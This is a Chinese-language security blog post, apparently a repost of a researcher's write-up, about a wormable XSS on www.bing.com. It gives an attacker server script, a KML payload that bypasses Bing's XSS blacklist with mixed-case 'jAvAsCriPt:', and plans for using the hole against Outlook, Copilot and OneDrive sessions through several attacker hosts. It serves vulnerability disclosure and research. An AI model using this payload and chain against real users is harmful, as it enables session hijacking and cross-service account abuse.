#  必应主站www.bing.com惊现蠕虫XSS漏洞   
原创 一个不正经的黑客  一个不正经的黑客   2024-11-28 13:31  
  
## 必应主站www.bing.com惊现蠕虫XSS漏洞  
## 研究计划  
  
我的主要目标是识别微软某一Web产品中的XSS漏洞，这一漏洞可能被利用，通过向将受害域列为允许来源的应用程序发送请求，从而对其他微软应用程序发起攻击。  
  
一个有效的侦察方法是对多个微软应用程序中允许的域名及其子域名进行交叉分析，以找出最适合进行漏洞审计的目标。  
  
然而，考虑到需要分析的潜在域名数量庞大，这将耗费大量时间。因此，我选择专注于微软搜索引擎，因为它具有广泛的功能，并被广泛应用于其他微软应用程序中。  
  
这一策略要求对Bing主域名（www.bing.com）上可能存在的API攻击面进行详细分析。  
## Pwn >= 2  
  
当用户登录微软账户时，他们会自动登录到多个互联的微软服务，包括 Bing、Outlook、Copilot 和 OneDrive。同样，登录 Google 账户也会获得整个 Google 生态系统的访问权限，如 Gmail、YouTube 和其他关联服务。  
  
基于这一概念，在 www.bing.com 上实现代码执行可能允许攻击者构造恶意请求，从而在其他互联的应用中触发敏感操作。  
  
**武器化的漏洞利用思路 / 大规模影响分析**  
  
**1. 构造恶意链接**  
  
利用 www.bing.com 上的 XSS 漏洞构造一个可以作为恶意链接的攻击载体。  
  
**2. 实现任意 JavaScript 执行**  
  
确保恶意链接中的载荷能够在主域名（www.bing.com）上执行任意 JavaScript，而不仅仅是在较不重要的子域名上。  
  
**3. 针对用户进行传播**  
  
考虑到数百万用户熟悉并频繁使用 Bing 的核心功能（例如图片搜索、视频、新闻、地图等），恶意链接的传播和交互可能不会引起用户的警觉，即使是警惕性较高的用户。  
  
**4. 跨应用访问的利用**  
  
一旦恶意 JavaScript 在 www.bing.com 上执行，攻击者可以进一步构造请求，在其他默认登录的微软应用中（例如 Outlook、Copilot、OneDrive）触发敏感操作。  
  
**5. 影响分析**  
  
通过评估在其他微软应用中可以触发的操作，结合用户的已认证会话，进一步分析漏洞的潜在影响范围。  
  
这类攻击能够有效利用不同微软服务之间的互联互通特性，使其成为高危漏洞的典型代表之一。  
## Vulnerability Research  
#### Bing Maps  
  
在探索 Bing Maps 开发者中心门户网站（https://www.bingmapsportal.com/）时，我注意到其中嵌入了一个带有引人注目的查询参数和功能的 URL。  
  
初步观察后，我的第一反应是验证是否存在潜在的跨域资源共享（CORS）漏洞的概念验证（PoC）。  
  
这个 API 端点不仅是测试的核心对象，还可能成为后续漏洞利用流程的切入点。  
  
通过此类分析，我们可以进一步评估其可能的安全隐患及利用价值，尤其是在跨域场景下的敏感数据访问和攻击链的构建中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrVWEBhVfQhADUSmgjlaNbyfwKibuSicibibTVWOthyu8TicMbb8adpbDq3qicaoG2sfGy9A0KicN8Ah0ARA/640?wx_fmt=png&from=appmsg "")  
#### 入口点  
##### 发现CORS 漏洞  
  
API 端点 /maps/configurable 通过查询参数 ?config= 加载一个自定义配置的 JSON 文件，例如：  
  
https://www.bing.com/maps/configurable?config=https://bingmapsisdk.blob.core.windows.net/isdksamples/configmap2.json  
  
进一步分析 JSON 文件的内容，发现其中的一个字段可以被攻击者利用，获取更多攻击向量并进行污染分析（taint analysis）。  
  
该字段 addLayerFromURL 用于加载一个 KML（Keyhole Markup Language）文件。KML 文件包含多种属性，用于对地图进行样式化，比如添加图片、气球弹窗、文本描述、3D 模型和地标等。  
  
**configmap2.json 的内容示例：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrVWEBhVfQhADUSmgjlaNbyGWUuxDMicmgzDB0YYpBOtibVC7BJTbNOUn7m0HGqddN3a7TMmicKvhNQA/640?wx_fmt=png&from=appmsg "")  
##### 概念验证：CORS漏洞  
  
为了演示攻击者如何在 www.bing.com 的上下文中渲染恶意地图，我需要设置一个服务器来托管以下两个文件：  
  
1.**配置地图的 JSON 文件**  
  
2.**用于为地图添加样式的 KML 文件**  
##### 攻击者的服务器配置  
  
以下是伪造服务器的代码示例，服务器域名为 poc.ngrok.app：  
```
app.get('/pwn.kml',(req,res)=>{
constkmlPath='C:/Users/pedbap/Desktop/attacker/pwn.kml';
constkmlFile=fs.readFileSync(kmlPath);

res.setHeader('Content-Type','application/octet-stream');

res.send(kmlFile);
});

app.get('/configmap2.json',(req,res)=>{
console.log('Request headers:',req.headers);

constconfigsdkpath='C:/Users/pedbap/Desktop/attacker/configmap2.json';
constsdkConfigmap=fs.readFileSync(configsdkpath);

res.setHeader('Content-Type','application/json');

res.send(sdkConfigmap);
});

app.listen(port,()=>{
console.log(`Serverlistening on port ${port}`);
});
```  
##### 在 www.bing.com 上展示恶意地图  
  
攻击者可以通过如下链接诱导用户访问，从而在受害者的 www.bing.com 会话中加载恶意内容。在截图中，可以看到用于感染用户的恶意链接。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrVWEBhVfQhADUSmgjlaNbyxgk2lEVvrFSUKzJE9AZIibkD9npMYkkvZzlUEHDZJ4OZyBTdXErEGFw/640?wx_fmt=png&from=appmsg "")  
## 触发 JavaScript 执行  
### 绕过 KML HTML/XSS 黑名单  
  
正如所示，我成功通过恶意的 KML 文件pwn.kml  
 利用核心属性为地图添加样式，包括插入气泡（Balloon）、文本描述（Text Description），甚至嵌入 HTML 标记（HTML markdown）。  
  
在此阶段，我将注意力转向绕过 XSS 黑名单，以通过自定义地图触发任意 JavaScript 执行。  
  
现有的 KML HTML/XSS 黑名单存储在https://r.bing.com/rp/FOkRg4MAeRHIuQBOa98npjZOg44.gz.js  
 中，其内容如下：  
```
[...]
n._htmlBlacklist=/on[a-zA-Z]{3,}=|(url|expression|alert)(\(|%)|(<|&[a-zA-Z0-9#];|\\u003c)(iframe|script|style|form|\?|\!)javascript:|console\.|document\.|window\./gi,
n.isPossibleXss=function(n){
returnthis._htmlBlacklist.test(n)
}
[...]
```  
  
我发现该黑名单存在的一个漏洞是未能处理大小写混合的字符。由于此漏洞，以下输入可以绕过 XSS/HTML 黑名单测试：  
```
jAvAsCriPt:(confirm)(1337)
```  
  
**pwn.kml 示例**  
  
以下是一个简化的示例，展示如何使用 XSS 绕过并将恶意负载存储在 KML 文件中：  
```
<?xml version="1.0"standalone="yes"encoding="UTF-8"?>
<kmlxmlns="http://www.opengis.net/kml/2.2"xmlns:atom="http://www.w3.org/2000/xmlns/">

[...]
<Folder>
<Placemark>
<description>
<![CDATA[
<ahref="jAvAsCriPt:(confirm)(1337)">Visit My Website</a>
]]>
</description>
</Placemark>
</Folder>
</kml>
```  
## 蠕虫式 XSS 因素  
- 攻击者能够激活或停用包含被篡改配置地图的恶意主机。这使他们可以在攻击失败时停用主机，从而增加追踪攻击的难度。  
- 攻击者可以设置多个端点来托管恶意地图，从而扩展攻击规模。  
  
通过重新审查用于与受害者分享的 URL，例如：https://www.bing.com/maps/configurable?config=[https://attacker-host.com]，攻击者可以使用多个主机，比如 https://attacker-host1.com、https://attacker-host2.com、https://attacker-host3.com 等。  
  
- 受害者不仅可能因为 www.bing.com  
 上的 XSS 漏洞而遭受攻击，还可能受到其他属于 Microsoft 服务生态系统的 Web 应用程序的攻击（这些应用程序允许来自 *.bing.com 的请求）。  
## 漏洞点评  
  
关注页面渲染的时候加载外部连接的内容，通过控制其中的属性值绕过过滤从而插入XSS语句最终完成攻击。  
  
Thanks for: https://medium.com/@pedbap/wormable-xss-www-bing-com-7d7cb52e7a12  
  
